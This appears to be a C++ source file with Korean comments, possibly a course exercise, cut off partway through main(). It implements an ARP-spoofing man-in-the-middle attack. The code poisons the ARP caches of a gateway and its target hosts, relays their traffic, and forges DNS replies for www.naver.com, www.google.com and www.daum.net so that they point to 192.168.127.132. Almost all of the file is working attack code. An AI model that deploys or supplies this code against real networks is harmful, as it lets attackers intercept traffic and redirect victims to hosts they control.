#include <iostream>
#include <string>
#include <vector>
#include <cstring>
#include <thread>
#include <atomic>
#include <mutex>
#include <condition_variable>
#include <memory>
#include <csignal>
#include <ifaddrs.h>
#include <net/if.h>
#include <unistd.h>
#include <pcap.h>
#include <arpa/inet.h>
#include <net/ethernet.h>
#include <netinet/if_ether.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <netinet/udp.h>
#include <cstdlib>
#include <cstdio>
#include <cctype>

// DNS 관련 상수
#define DNS_PORT 53

// 전역 DNS 응답 템플릿 저장소
std::vector<uint8_t> dns_template_naver;
std::vector<uint8_t> dns_template_google;
std::vector<uint8_t> dns_template_daum;

// 시스템 헤더의 ip_header와 충돌을 피하기 위해 사용자 정의 IP 헤더 정의 (Ethernet 뒤에 위치)
struct my_ip_header {
    u_int8_t  ip_vhl;   // 버전 및 헤더 길이 (상위 4비트: 버전, 하위 4비트: 헤더 길이)
    u_int8_t  ip_tos;   // 서비스 타입
    u_int16_t ip_len;   // 전체 길이
    u_int16_t ip_id;    // 식별자
    u_int16_t ip_off;   // 플래그 및 분할 오프셋
    u_int8_t  ip_ttl;   // 생존 시간
    u_int8_t  ip_p;     // 프로토콜
    u_int16_t ip_sum;   // 체크섬
    u_int32_t ip_src;   // 출발지 주소
    u_int32_t ip_dst;   // 목적지 주소
};

// UDP 헤더 구조체
struct udp_header {
    u_int16_t uh_sport;   // 소스 포트
    u_int16_t uh_dport;   // 목적지 포트
    u_int16_t uh_len;     // UDP 길이
    u_int16_t uh_sum;     // 체크섬
};

// DNS 헤더 구조체
struct dns_header {
    u_int16_t id;       // 식별자
    u_int16_t flags;    // 플래그
    u_int16_t qdcount;  // 질문 레코드 수
    u_int16_t ancount;  // 응답 레코드 수
    u_int16_t nscount;  // 권한 레코드 수
    u_int16_t arcount;  // 추가 레코드 수
};

// ARP 헤더 구조체
struct arp_header {
    u_int16_t htype;    
    u_int16_t ptype;    
    u_int8_t hlen;      
    u_int8_t plen;      
    u_int16_t oper;     
    u_int8_t sha[6];    
    u_int8_t spa[4];    
    u_int8_t tha[6];    
    u_int8_t tpa[4];    
};

// 함수 프로토타입 선언
std::string mac_to_string(const u_int8_t* mac);
std::string ip_to_string(const u_int8_t* ip);
void string_to_ip(const char* ip_str, u_int8_t* ip);
bool string_to_mac(const char* mac_str, u_int8_t* mac);
bool mac_equals(const u_int8_t* mac1, const u_int8_t* mac2);
bool ip_equals(const u_int8_t* ip1, const u_int8_t* ip2);

// 인터페이스의 MAC, IP 가져오기
bool get_interface_mac(const std::string& interface_name, u_int8_t* mac) {
    struct ifreq ifr;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        std::cerr << "소켓 생성 실패" << std::endl;
        return false;
    }
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, interface_name.c_str(), IFNAMSIZ - 1);
    if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) {
        std::cerr << "MAC 가져오기 실패: " << interface_name << std::endl;
        close(sock);
        return false;
    }
    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
    close(sock);
    std::cout << "인터페이스 " << interface_name << "의 MAC: " << mac_to_string(mac) << std::endl;
    return true;
}
bool get_interface_ip(const std::string& interface_name, u_int8_t* ip) {
    struct ifaddrs *ifaddr, *ifa;
    if (getifaddrs(&ifaddr) == -1) {
        std::cerr << "인터페이스 정보 가져오기 실패" << std::endl;
        return false;
    }
    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr == NULL)
            continue;
        if (ifa->ifa_addr->sa_family == AF_INET && interface_name == ifa->ifa_name) {
            struct sockaddr_in* addr = (struct sockaddr_in*)ifa->ifa_addr;
            memcpy(ip, &addr->sin_addr, 4);
            freeifaddrs(ifaddr);
            std::cout << "인터페이스 " << interface_name << "의 IP: " << ip_to_string(ip) << std::endl;
            return true;
        }
    }
    freeifaddrs(ifaddr);
    std::cerr << "인터페이스 " << interface_name << "의 IPv4 주소를 찾을 수 없음" << std::endl;
    return false;
}

// MAC 주소 → 문자열 변환
std::string mac_to_string(const u_int8_t* mac) {
    char buf[18];
    snprintf(buf, sizeof(buf), "%02x:%02x:%02x:%02x:%02x:%02x",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return std::string(buf);
}

// IP 주소 → 문자열 변환
std::string ip_to_string(const u_int8_t* ip) {
    char buf[16];
    snprintf(buf, sizeof(buf), "%d.%d.%d.%d", ip[0], ip[1], ip[2], ip[3]);
    return std::string(buf);
}

// 문자열 IP → 바이트 배열 변환
void string_to_ip(const char* ip_str, u_int8_t* ip) {
    memset(ip, 0, 4);
    unsigned int a, b, c, d;
    if (sscanf(ip_str, "%u.%u.%u.%u", &a, &b, &c, &d) == 4) {
        ip[0] = static_cast<u_int8_t>(a);
        ip[1] = static_cast<u_int8_t>(b);
        ip[2] = static_cast<u_int8_t>(c);
        ip[3] = static_cast<u_int8_t>(d);
    } else {
        std::cerr << "잘못된 IP 형식: " << ip_str << std::endl;
    }
}

// 문자열 MAC → 바이트 배열 변환
bool string_to_mac(const char* mac_str, u_int8_t* mac) {
    return sscanf(mac_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                  &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]) == 6;
}

// MAC 주소 비교
bool mac_equals(const u_int8_t* mac1, const u_int8_t* mac2) {
    return memcmp(mac1, mac2, 6) == 0;
}

// IP 주소 비교
bool ip_equals(const u_int8_t* ip1, const u_int8_t* ip2) {
    return memcmp(ip1, ip2, 4) == 0;
}

// ARP 패킷 생성 (Ethernet 헤더 + ARP 헤더)
void create_arp_packet(u_int8_t* packet, const u_int8_t* src_mac, const u_int8_t* dst_mac,
                         const u_int8_t* src_ip, const u_int8_t* dst_ip, u_int16_t oper) {
    struct ether_header* eth = (struct ether_header*)packet;
    memcpy(eth->ether_dhost, dst_mac, 6);
    memcpy(eth->ether_shost, src_mac, 6);
    eth->ether_type = htons(ETHERTYPE_ARP);
    
    arp_header* arp = (arp_header*)(packet + sizeof(ether_header));
    arp->htype = htons(1);
    arp->ptype = htons(0x0800);
    arp->hlen = 6;
    arp->plen = 4;
    arp->oper = htons(oper);
    memcpy(arp->sha, src_mac, 6);
    memcpy(arp->spa, src_ip, 4);
    memcpy(arp->tha, dst_mac, 6);
    memcpy(arp->tpa, dst_ip, 4);
}

// 브로드캐스트 및 제로 MAC 주소 상수
const u_int8_t BROADCAST_MAC[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
const u_int8_t ZERO_MAC[6] = {0x00,0x00,0x00,0x00,0x00,0x00};

// 전역 신호 변수
std::atomic<bool> global_running(true);

// 시그널 핸들러
void signal_handler(int signum) {
    if (signum == SIGINT) {
        std::cout << "\n프로그램 종료 중..." << std::endl;
        global_running = false;
    }
}

//─────────────────────────────────────────────────────────────
// [DNS 응답 템플릿 로드 및 DNS 응답 전송 관련 함수]
//─────────────────────────────────────────────────────────────

// pcap 파일에서 첫 번째 DNS 응답 패킷을 로드하여 템플릿으로 저장
bool load_dns_response_template(const char* filename, std::vector<uint8_t>& dns_response_template) {
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap_handle = pcap_open_offline(filename, errbuf);
    if (!pcap_handle) {
        std::cerr << "pcap 열기 실패: " << errbuf << std::endl;
        return false;
    }
    
    struct pcap_pkthdr* header;
    const u_char* packet;
    int res;
    while ((res = pcap_next_ex(pcap_handle, &header, &packet)) >= 0) {
        const my_ip_header* ip_hdr = reinterpret_cast<const my_ip_header*>(packet + 14);
        if (ip_hdr->ip_p != IPPROTO_UDP) continue;
        const udp_header* udp_hdr = reinterpret_cast<const udp_header*>(packet + 14 + ((ip_hdr->ip_vhl & 0x0f) * 4));
        // DNS 응답은 보통 소스 포트가 53
        if (ntohs(udp_hdr->uh_sport) != DNS_PORT) continue;
        size_t packet_len = header->caplen;
        dns_response_template.assign(packet, packet + packet_len);
        pcap_close(pcap_handle);
        std::cout << filename << " 로부터 DNS 응답 템플릿 로드 완료 (" << packet_len << " 바이트)" << std::endl;
        return true;
    }
    std::cerr << "pcap에서 DNS 응답 패킷을 찾지 못함: " << filename << std::endl;
    pcap_close(pcap_handle);
    return false;
}

// DNS 쿼리 패킷에서 QNAME(도메인 이름) 추출
std::string extract_domain_name(const uint8_t* dns_data, size_t dns_len) {
    std::string domain;
    size_t pos = 12; // DNS 헤더는 12바이트
    while (pos < dns_len) {
        uint8_t len = dns_data[pos];
        if (len == 0) break;
        if (!domain.empty()) domain.push_back('.');
        pos++;
        for (int i = 0; i < len && pos < dns_len; i++, pos++) {
            domain.push_back(dns_data[pos]);
        }
    }
    return domain;
}

// DNS 응답 템플릿을 복사 후 수정하여 쿼리의 정보(쿼리 ID, 목적지 IP/포트)를 반영하고,
// 그리고 DNS 응답의 A 레코드 RDATA 값을 192.168.127.132로 수정한 후 전송합니다.
// (IP 헤더의 src는 그대로 유지하여, 원래 DNS 서버의 주소로 보이도록 함)
void send_modified_dns_response(const std::vector<uint8_t>& dns_response_template,
                                const u_int8_t* query_packet, size_t query_packet_len) {
    // 템플릿 복사
    std::vector<uint8_t> packet = dns_response_template;
    size_t eth_len = 14; // Ethernet 헤더 길이 (원시 전송 시 제외)
    if (packet.size() <= eth_len) return;
    my_ip_header* ip_resp = reinterpret_cast<my_ip_header*>(&packet[eth_len]);
    int ip_resp_len = (ip_resp->ip_vhl & 0x0f) * 4;
    udp_header* udp_resp = reinterpret_cast<udp_header*>(&packet[eth_len + ip_resp_len]);
    // dns_resp는 UDP 페이로드의 시작 (DNS 헤더부터 시작)
    uint8_t* dns_resp = &packet[eth_len + ip_resp_len + sizeof(udp_header)];
    size_t dns_len = packet.size() - (eth_len + ip_resp_len + sizeof(udp_header));

    // 쿼리 패킷에서 정보 추출 (Ethernet 이후)
    const size_t query_eth_len = 14;
    const my_ip_header* ip_query = reinterpret_cast<const my_ip_header*>(query_packet + query_eth_len);
    int ip_query_len = (ip_query->ip_vhl & 0x0f) * 4;
    const udp_header* udp_query = reinterpret_cast<const udp_header*>(query_packet + query_eth_len + ip_query_len);
    const uint8_t* dns_query = query_packet + query_eth_len + ip_query_len + sizeof(udp_header);

    // DNS 헤더의 첫 2바이트(ID)를 쿼리와 동일하게 수정
    memcpy(dns_resp, dns_query, 2);

    // IP 헤더: 목적지 IP를 쿼리의 출발지로 설정 (즉, 응답을 보내야 하는 대상)
    ip_resp->ip_dst = ip_query->ip_src;
    // UDP 헤더: 목적지 포트를 쿼리의 소스 포트로 설정
    udp_resp->uh_dport = udp_query->uh_sport;

    // ★ 여기서 A 레코드의 응답 IP(RDATA)를 192.168.127.132로 변경합니다.
    // DNS 응답은 DNS 헤더(12바이트), Question 섹션, 그리고 Answer 섹션으로 구성됩니다.
    // 먼저, DNS 헤더에서 Answer Count(ancount)를 가져옵니다.
    if(dns_len < 12) return; // DNS 헤더 최소 길이
    dns_header* dns_hdr = reinterpret_cast<dns_header*>(dns_resp);
    uint16_t ancount = ntohs(dns_hdr->ancount);

    // Question 섹션 건너뛰기: DNS 헤더 이후부터 시작
    size_t offset = 12;
    // QNAME: 0이 나타날 때까지 (포인터 압축은 여기서는 단순 처리하지 않습니다)
    while (offset < dns_len && dns_resp[offset] != 0) {
        offset += dns_resp[offset] + 1;
    }
    offset++; // 0바이트 건너뜀
    offset += 4; // QTYPE(2) + QCLASS(2) 건너뜀

    // Answer 섹션 처리: ancount개의 레코드 반복
    for (int i = 0; i < ancount && offset + 12 <= dns_len; i++) {
        // Answer 레코드의 NAME 필드는 보통 포인터(2바이트)일 가능성이 큽니다.
        // 이후 TYPE(2), CLASS(2), TTL(4), RDLENGTH(2)
        uint16_t answer_type;
        memcpy(&answer_type, dns_resp + offset + 2, 2);
        answer_type = ntohs(answer_type);

        uint16_t rdlength;
        memcpy(&rdlength, dns_resp + offset + 10, 2);
        rdlength = ntohs(rdlength);

        // 만약 A 레코드 (TYPE 1)이고, RDATA 길이가 4바이트이면
        if (answer_type == 1 && rdlength == 4) {
            size_t rdata_offset = offset + 12;
            if (rdata_offset + 4 <= dns_len) {
                uint32_t new_a = inet_addr("192.168.127.132");
                memcpy(dns_resp + rdata_offset, &new_a, 4);
                std::cout << "A 레코드 응답 IP를 192.168.127.132로 수정함." << std::endl;
            }
        }
        // 다음 Answer 레코드로 이동: NAME은 2바이트(일반 포인터), 그 다음 필드의 길이 고정 + RDLENGTH
        offset += 12 + rdlength;
        if(offset > dns_len) break;
    }

    // IP 체크섬 재계산
    ip_resp->ip_sum = 0;
    uint16_t* ip_words = reinterpret_cast<uint16_t*>(ip_resp);
    unsigned long sum = 0;
    for (int i = 0; i < ip_resp_len / 2; ++i)
         sum += ntohs(ip_words[i]);
    sum = (sum & 0xFFFF) + (sum >> 16);
    ip_resp->ip_sum = htons(~sum);

    // 원시 소켓을 이용해 전송 (Ethernet 헤더는 제외)
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        std::cerr << "원시 소켓 생성 실패" << std::endl;
        return;
    }
    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    sockaddr_in dest{};
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = ip_query->ip_src;
    if (sendto(sock, packet.data() + eth_len, packet.size() - eth_len, 0,
         reinterpret_cast<sockaddr*>(&dest), sizeof(dest)) < 0) {
         std::cerr << "DNS 응답 전송 실패" << std::endl;
    } else {
         std::cout << "Spoofed DNS 응답 전송: " << ip_to_string(reinterpret_cast<const u_int8_t*>(&ip_query->ip_src)) << std::endl;
    }
    close(sock);
}



//─────────────────────────────────────────────────────────────
// [ARP Spoofing 관련 클래스 및 함수]
//─────────────────────────────────────────────────────────────

// ARP 스푸핑 대상 클래스
class SpoofTarget {
private:
    u_int8_t ip[4];
    u_int8_t mac[6];
    std::string ip_str;
    std::unique_ptr<std::thread> thread_ptr;
    std::atomic<bool> running;
public:
    SpoofTarget() : running(false) {
        memset(ip, 0, 4);
        memset(mac, 0, 6);
    }
    SpoofTarget(const std::string& ip_str_) : ip_str(ip_str_), running(false) {
        string_to_ip(ip_str_.c_str(), ip);
        memset(mac, 0, 6);
    }
    SpoofTarget(SpoofTarget&& other) noexcept 
      : ip_str(std::move(other.ip_str)), thread_ptr(std::move(other.thread_ptr)), running(other.running.load()) {
        memcpy(ip, other.ip, 4);
        memcpy(mac, other.mac, 6);
        other.running = false;
    }
    SpoofTarget& operator=(SpoofTarget&& other) noexcept {
        if (this != &other) {
            stop_thread();
            ip_str = std::move(other.ip_str);
            thread_ptr = std::move(other.thread_ptr);
            running = other.running.load();
            memcpy(ip, other.ip, 4);
            memcpy(mac, other.mac, 6);
            other.running = false;
        }
        return *this;
    }
    ~SpoofTarget() { stop_thread(); }
    void stop_thread() {
        if (running && thread_ptr && thread_ptr->joinable()) {
            running = false;
            thread_ptr->join();
        }
    }
    template<typename Func, typename... Args>
    void start_thread(Func&& func, Args&&... args) {
        stop_thread();
        running = true;
        thread_ptr = std::make_unique<std::thread>(std::forward<Func>(func), std::forward<Args>(args)...);
    }
    const u_int8_t* get_ip() const { return ip; }
    const u_int8_t* get_mac() const { return mac; }
    const std::string& get_ip_str() const { return ip_str; }
    bool is_running() const { return running; }
    void set_mac(const u_int8_t* mac_) { memcpy(mac, mac_, 6); }
    void set_running(bool val) { running = val; }
    SpoofTarget(const SpoofTarget&) = delete;
    SpoofTarget& operator=(const SpoofTarget&) = delete;
};

// ARP Spoofer 클래스
class ArpSpoofer {
private:
    pcap_t* handle;
    char errbuf[PCAP_ERRBUF_SIZE];
    std::string interface;
    u_int8_t attacker_mac[6];
    u_int8_t attacker_ip[4];
    u_int8_t gateway_mac[6];
    u_int8_t gateway_ip[4];
    std::string gateway_ip_str;
    std::vector<std::unique_ptr<SpoofTarget>> targets;
    std::atomic<bool> forwarding_running;
    std::unique_ptr<std::thread> forwarding_thread;
    std::mutex mutex;
    std::condition_variable cv;
public:
    ArpSpoofer(const std::string& iface) : interface(iface), handle(nullptr), forwarding_running(false) {
        memset(errbuf, 0, PCAP_ERRBUF_SIZE);
        memset(attacker_mac, 0, 6);
        memset(attacker_ip, 0, 4);
        memset(gateway_mac, 0, 6);
        memset(gateway_ip, 0, 4);
    }
    ~ArpSpoofer() {
        stop_all();
        if (handle) pcap_close(handle);
    }
    bool initialize() {
        handle = pcap_open_live(interface.c_str(), BUFSIZ, 1, 1000, errbuf);
        if (!handle) {
            std::cerr << "인터페이스 열기 실패: " << errbuf << std::endl;
            return false;
        }
        struct bpf_program fp;
        char filter_exp[] = "arp or ip";
        if (pcap_compile(handle, &fp, filter_exp, 0, PCAP_NETMASK_UNKNOWN) == -1) {
            std::cerr << "필터 컴파일 실패: " << pcap_geterr(handle) << std::endl;
            std::cout << "경고: 모든 패킷 캡처됨" << std::endl;
        } else {
            if (pcap_setfilter(handle, &fp) == -1) {
                std::cerr << "필터 설정 실패: " << pcap_geterr(handle) << std::endl;
                std::cout << "경고: 모든 패킷 캡처됨" << std::endl;
            } else {
                std::cout << "ARP 및 IP 패킷 필터 설정 성공" << std::endl;
            }
        }
        if (!get_interface_mac(interface, attacker_mac)) {
            std::cerr << "인터페이스 MAC 가져오기 실패: " << interface << std::endl;
            return false;
        }
        if (!get_interface_ip(interface, attacker_ip)) {
            std::cerr << "인터페이스 IP 가져오기 실패: " << interface << std::endl;
            return false;
        }
        std::cout << "인터페이스 " << interface << " 열림" << std::endl;
        return true;
    }
    bool set_gateway(const std::string& gateway_ip_str_) {
        gateway_ip_str = gateway_ip_str_;
        string_to_ip(gateway_ip_str.c_str(), gateway_ip);
        std::cout << "설정된 주소:" << std::endl;
        std::cout << "공격자 MAC: " << mac_to_string(attacker_mac) << std::endl;
        std::cout << "공격자 IP: " << ip_to_string(attacker_ip) << std::endl;
        std::cout << "게이트웨이 IP: " << ip_to_string(gateway_ip) << std::endl;
        if (!get_mac_from_ip(gateway_ip, gateway_mac)) {
            std::cerr << "게이트웨이 MAC 찾기 실패" << std::endl;
            return false;
        }
        std::cout << "게이트웨이 MAC: " << mac_to_string(gateway_mac) << std::endl;
        return true;
    }
    bool add_target(const std::string& target_ip_str) {
        auto target = std::make_unique<SpoofTarget>(target_ip_str);
        u_int8_t target_mac[6];
        if (!get_mac_from_ip(target->get_ip(), target_mac)) {
            std::cerr << "대상 MAC 찾기 실패: " << target_ip_str << std::endl;
            return false;
        }
        target->set_mac(target_mac);
        std::cout << "스푸핑 대상 추가:" << std::endl;
        std::cout << "IP: " << target_ip_str << std::endl;
        std::cout << "MAC: " << mac_to_string(target_mac) << std::endl;
        std::lock_guard<std::mutex> lock(mutex);
        targets.push_back(std::move(target));
        return true;
    }
    bool get_mac_from_ip(const u_int8_t* target_ip, u_int8_t* target_mac) {
        std::cout << "찾는 IP: " << ip_to_string(target_ip) << std::endl;
        u_int8_t packet[sizeof(ether_header) + sizeof(arp_header)];
        const int MAX_ATTEMPTS = 3;
        for (int attempt = 0; attempt < MAX_ATTEMPTS; attempt++) {
            create_arp_packet(packet, attacker_mac, BROADCAST_MAC, attacker_ip, target_ip, 1);
            if (pcap_sendpacket(handle, packet, sizeof(packet)) != 0) {
                std::cerr << "패킷 전송 실패: " << pcap_geterr(handle) << std::endl;
                continue;
            }
            struct pcap_pkthdr header;
            const u_char* packet_data;
            time_t start_time = time(NULL);
            while (time(NULL) - start_time < 10) {
                packet_data = pcap_next(handle, &header);
                if (!packet_data) continue;
                struct ether_header* eth = (struct ether_header*)packet_data;
                if (ntohs(eth->ether_type) != ETHERTYPE_ARP) continue;
                arp_header* arp = (arp_header*)(packet_data + sizeof(ether_header));
                if (memcmp(arp->spa, target_ip, 4) == 0) {
                    memcpy(target_mac, arp->sha, 6);
                    std::cout << "MAC 찾음: " << mac_to_string(target_mac) << std::endl;
                    return true;
                }
            }
        }
        return false;
    }
    void send_arp_spoofing_packet(const SpoofTarget* target) {
        u_int8_t packet[sizeof(ether_header) + sizeof(arp_header)];
        std::cout << "게이트웨이 IP 스푸핑 패킷: " << ip_to_string(gateway_ip) << std::endl;
        create_arp_packet(packet, attacker_mac, target->get_mac(), gateway_ip, target->get_ip(), 2);
        if (pcap_sendpacket(handle, packet, sizeof(packet)) != 0) {
            std::cerr << "대상 스푸핑 패킷 전송 실패: " << pcap_geterr(handle) << std::endl;
        } else {
            std::cout << "대상 " << target->get_ip_str() << " 에게 스푸핑 패킷 전송 성공" << std::endl;
        }
        std::cout << "대상 IP 스푸핑 패킷: " << target->get_ip_str() << std::endl;
        create_arp_packet(packet, attacker_mac, gateway_mac, target->get_ip(), gateway_ip, 2);
        if (pcap_sendpacket(handle, packet, sizeof(packet)) != 0) {
            std::cerr << "게이트웨이 스푸핑 패킷 전송 실패: " << pcap_geterr(handle) << std::endl;
        } else {
            std::cout << "게이트웨이에 스푸핑 패킷 전송 성공 (대상 IP: " << target->get_ip_str() << ")" << std::endl;
        }
    }
    // 포워딩되는 패킷 중 DNS 패킷을 감지하면, 도메인에 따라 spoofed DNS 응답 전송
    void forward_packet(const u_int8_t* packet_data, size_t packet_len) {
        if (packet_len < sizeof(ether_header) + sizeof(my_ip_header))
            return;
        u_int8_t* new_packet = new u_int8_t[packet_len];
        memcpy(new_packet, packet_data, packet_len);
        struct ether_header* eth = (struct ether_header*)new_packet;
        my_ip_header* ip = (my_ip_header*)(new_packet + sizeof(ether_header));
        u_int8_t src_ip[4], dst_ip[4];
        memcpy(src_ip, &ip->ip_src, 4);
        memcpy(dst_ip, &ip->ip_dst, 4);
        
        bool src_is_gateway = ip_equals(src_ip, gateway_ip);
        if (src_is_gateway) {
            memcpy(eth->ether_shost, attacker_mac, 6);
            bool found = false;
            {
                std::lock_guard<std::mutex> lock(mutex);
                for (const auto& target : targets) {
                    if (ip_equals(dst_ip, target->get_ip())) {
                        memcpy(eth->ether_dhost, target->get_mac(), 6);
                        found = true;
                        break;
                    }
                }
            }
            if (!found) {
                delete[] new_packet;
                return;
            }
        } else {
            memcpy(eth->ether_shost, attacker_mac, 6);
            memcpy(eth->ether_dhost, gateway_mac, 6);
        }
        
        // DNS 패킷 감지 (UDP 프로토콜)
        if (ip->ip_p == IPPROTO_UDP) {
            int ip_header_len = (ip->ip_vhl & 0x0f) * 4;
            if (packet_len >= sizeof(ether_header) + ip_header_len + sizeof(udp_header)) {
                udp_header* udp = (udp_header*)(new_packet + sizeof(ether_header) + ip_header_len);
                u_int16_t sport = ntohs(udp->uh_sport);
                u_int16_t dport = ntohs(udp->uh_dport);
                if (sport == DNS_PORT || dport == DNS_PORT) {
                    uint8_t* dns_ptr = new_packet + sizeof(ether_header) + ip_header_len + sizeof(udp_header);
                    size_t dns_len = packet_len - (sizeof(ether_header) + ip_header_len + sizeof(udp_header));
                    std::string domain = extract_domain_name(dns_ptr, dns_len);
                    // 소문자 변환 및 끝의 '.' 제거
                    for (auto &c : domain) c = tolower(c);
                    if (!domain.empty() && domain.back() == '.')
                        domain.pop_back();
                    
                    // 만약 대상 도메인이 스푸핑 대상이고, 게이트웨이에서 온 패킷이면,
                    // 게이트웨이의 정상 DNS 응답은 drop하고 여러분이 만든 패킷을 전송합니다.
                    if ((domain == "www.naver.com" || domain == "www.google.com" || domain == "www.daum.net") &&
                        ip_equals(src_ip, gateway_ip)) {
                        std::cout << "게이트웨이 DNS 응답 (" << domain << ") drop. 내 패킷 전송 시작." << std::endl;
                        // 여러분이 만든 패킷 전송 (각 도메인에 맞는 템플릿 사용)
                        if (domain == "www.naver.com")
                            send_modified_dns_response(dns_template_naver, packet_data, packet_len);
                        else if (domain == "www.google.com")
                            send_modified_dns_response(dns_template_google, packet_data, packet_len);
                        else if (domain == "www.daum.net")
                            send_modified_dns_response(dns_template_daum, packet_data, packet_len);
                        delete[] new_packet;
                        return;
                    }
                }
            }
        }

        
        // 일반 패킷 포워딩
        if (pcap_sendpacket(handle, new_packet, packet_len) != 0)
            std::cerr << "패킷 포워딩 실패: " << pcap_geterr(handle) << std::endl;
        delete[] new_packet;
    }
    void start_packet_forwarding() {
        if (forwarding_running) {
            std::cout << "패킷 포워딩 이미 실행 중" << std::endl;
            return;
        }
        forwarding_running = true;
        forwarding_thread = std::make_unique<std::thread>([this]() {
            std::cout << "패킷 포워딩 시작" << std::endl;
            struct pcap_pkthdr* header;
            const u_int8_t* packet_data;
            int res;
            while (forwarding_running && global_running) {
                res = pcap_next_ex(handle, &header, &packet_data);
                if (res == 0)
                    continue;
                else if (res < 0) {
                    std::cerr << "패킷 캡처 오류: " << pcap_geterr(handle) << std::endl;
                    break;
                }
                if (is_spoofed_packet(packet_data, header->len))
                    forward_packet(packet_data, header->len);
            }
            std::cout << "패킷 포워딩 종료" << std::endl;
        });
    }
    void start_spoofing_all() {
        std::lock_guard<std::mutex> lock(mutex);
        for (auto& target : targets) {
            if (!target->is_running()) {
                target->start_thread(&ArpSpoofer::spoof_target_thread, this, target.get());
            }
        }
    }
    void spoof_target_thread(SpoofTarget* target) {
        std::cout << "대상 " << target->get_ip_str() << " 스푸핑 시작" << std::endl;
        while (target->is_running() && global_running) {
            send_arp_spoofing_packet(target);
            sleep(1);
        }
        std::cout << "대상 " << target->get_ip_str() << " 스푸핑 종료" << std::endl;
    }
    void send_recover_arp_packets() {
        std::cout << "ARP 테이블 복구 중..." << std::endl;
        std::lock_guard<std::mutex> lock(mutex);
        for (auto& target : targets) {
            u_int8_t gateway_recov_packet[sizeof(ether_header) + sizeof(arp_header)];
            create_arp_packet(gateway_recov_packet, target->get_mac(), gateway_mac, target->get_ip(), gateway_ip, 2);
            if (pcap_sendpacket(handle, gateway_recov_packet, sizeof(gateway_recov_packet)) != 0) {
                std::cerr << "게이트웨이 복구 패킷 전송 실패: " << pcap_geterr(handle) << std::endl;
            } else {
                std::cout << "게이트웨이 복구 패킷 전송 성공: " 
                          << target->get_ip_str() << " -> " << ip_to_string(gateway_ip) << std::endl;
            }
            u_int8_t packet2[sizeof(ether_header) + sizeof(arp_header)];
            create_arp_packet(packet2, gateway_mac, target->get_mac(), gateway_ip, target->get_ip(), 2);
            if (pcap_sendpacket(handle, packet2, sizeof(packet2)) != 0) {
                std::cerr << "대상 복구 패킷 전송 실패: " << pcap_geterr(handle) << std::endl;
            } else {
                std::cout << "대상 복구 패킷 전송 성공: " 
                          << ip_to_string(gateway_ip) << " -> " << target->get_ip_str() << std::endl;
            }
            for (int i = 0; i < 3; i++) {
                pcap_sendpacket(handle, gateway_recov_packet, sizeof(gateway_recov_packet));
                pcap_sendpacket(handle, packet2, sizeof(packet2));
                usleep(100000);
            }
        }
    }
    void stop_all() {
        std::cout << "\n프로그램 종료 중..." << std::endl;
        send_recover_arp_packets();
        if (forwarding_running) {
            forwarding_running = false;
            cv.notify_all();
            if (forwarding_thread && forwarding_thread->joinable())
                forwarding_thread->join();
        }
        std::lock_guard<std::mutex> lock(mutex);
        for (auto& target : targets)
            target->stop_thread();
        std::cout << "모든 스레드 종료 완료" << std::endl;
    }
    bool is_spoofed_packet(const u_int8_t* packet_data, size_t packet_len) {
        if (packet_len < sizeof(ether_header))
            return false;
        struct ether_header* eth = (struct ether_header*)packet_data;
        if (ntohs(eth->ether_type) != ETHERTYPE_IP)
            return false;
        if (packet_len < sizeof(ether_header) + sizeof(my_ip_header))
            return false;
        my_ip_header* ip = (my_ip_header*)(packet_data + sizeof(ether_header));
        u_int8_t src_ip[4], dst_ip[4];
        memcpy(src_ip, &ip->ip_src, 4);
        memcpy(dst_ip, &ip->ip_dst, 4);
        bool src_is_target = false, dst_is_target = false;
        bool src_is_gateway = ip_equals(src_ip, gateway_ip);
        bool dst_is_gateway = ip_equals(dst_ip, gateway_ip);
        {
            std::lock_guard<std::mutex> lock(mutex);
            for (const auto& target : targets) {
                if (ip_equals(src_ip, target->get_ip()))
                    src_is_target = true;
                if (ip_equals(dst_ip, target->get_ip()))
                    dst_is_target = true;
            }
        }
        return (src_is_target && dst_is_gateway) || (src_is_gateway && dst_is_target);
    }
    static bool enable_ip_forwarding() {
        system("echo 1 > /proc/sys/net/ipv4/ip_forward");
        std::cout << "시스템 IP 포워딩 활성화" << std::endl;
        return true;
    }
    static bool disable_ip_forwarding() {
        system("echo 0 > /proc/sys/net/ipv4/ip_forward");
        std::cout << "시스템 IP 포워딩 비활성화" << std::endl;
        return true;
    }
};



int main(int argc, char* argv[]) {
    if (argc < 3) {
        std::cerr << "사용법: " << argv[0] << " <인터페이스> <게이트웨이IP> <대상IP1> [<대상IP2> ...]" << std::endl;
        std::cerr << "예시: " << argv[0] << " eth0 192.168.1.1 192.168.1.100 192.168.1.101" << std::endl;
        return 1;
    }
    std::string interface = argv[1];
    std::string gateway_ip = argv[2];
    
    // 시스템 IP 포워딩 활성화
    ArpSpoofer::enable_ip_forwarding();
    std::signal(SIGINT, signal_handler);
    
    // DNS 응답 템플릿 로드
    if (!load_dns_response_template("dns_naver.pcap", dns_template_naver))
        std::cerr << "dns_naver.pcap 로드 실패" << std::endl;
    if (!load_dns_response_template("dns_google.pcap", dns_template_google))
        std::cerr << "dns_google.pcap 로드 실패" << std::endl;
    if (!load_dns_response_template("dns_daum.pcap", dns_template_daum))
        std::cerr << "dns_daum.pcap 로드 실패" << std::endl;
    
    ArpSpoofer* spoofer = new ArpSpoofer(interface);
    std::atexit([]() { ArpSpoofer::disable_ip_forwarding(); });
    
    if (!spoofer->initialize()) {
        delete spoofer;
        return 1;
    }
    if (!spoofer->set_gateway(gateway_ip)) {
        delete spoofer;
        return 1;
    }
    for (int i = 3; i < argc; i++) {
        std::string target_ip = argv[i];
        if (!spoofer->add_target(target_ip))
            std::cerr << "대상 " << target_ip << " 추가 실패" << std::endl;
    }
